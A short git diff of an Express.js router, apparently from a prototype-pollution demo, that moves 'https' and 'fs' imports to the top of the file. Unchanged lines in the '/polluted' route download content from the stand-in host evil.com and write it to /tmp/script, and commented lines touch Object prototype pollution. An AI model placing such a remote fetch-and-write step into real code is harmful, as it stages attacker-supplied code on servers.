@@ -1,6 +1,7 @@
 const express = require('express');
 const router = express.Router();
-
+const https = require("https");
+const fs = require("fs");
 
 const keys = {};
 
@@ -16,8 +17,7 @@ router.get('/polluted', function(req, res) {
   // Object.assign(Object.constructor.prototype, keys);
   // console.log("proto %o", Object);
 
-  var https = require("https");
-  var fs = require("fs");
+
   https.get('https://evil.com/script', res => {
     res.on("data", d => {
       fs.writeFileSync("/tmp/script", d)
